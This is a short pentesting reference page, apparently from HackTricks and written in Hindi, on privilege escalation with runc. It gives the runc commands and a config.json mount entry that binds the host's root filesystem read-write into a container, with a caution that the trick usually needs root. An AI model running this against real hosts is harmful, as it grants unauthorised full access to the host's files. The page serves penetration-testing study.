# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basic information

यदि आप **runc** के बारे में अधिक जानना चाहते हैं, तो निम्नलिखित page देखें:


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

यदि आपको पता चलता है कि host में `runc` installed है, तो आप **host के root / folder को mount करके एक container run** करने में सक्षम हो सकते हैं।
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> यह हमेशा काम नहीं करेगा क्योंकि runc का default operation root के रूप में चलना है, इसलिए इसे unprivileged user के रूप में चलाना काम नहीं कर सकता (जब तक आपके पास rootless configuration न हो)। rootless configuration को default बनाना सामान्यतः अच्छा विचार नहीं है, क्योंकि rootless containers के अंदर काफी ऐसी restrictions होती हैं जो rootless containers के बाहर लागू नहीं होतीं।

{{#include ../../banners/hacktricks-training.md}}
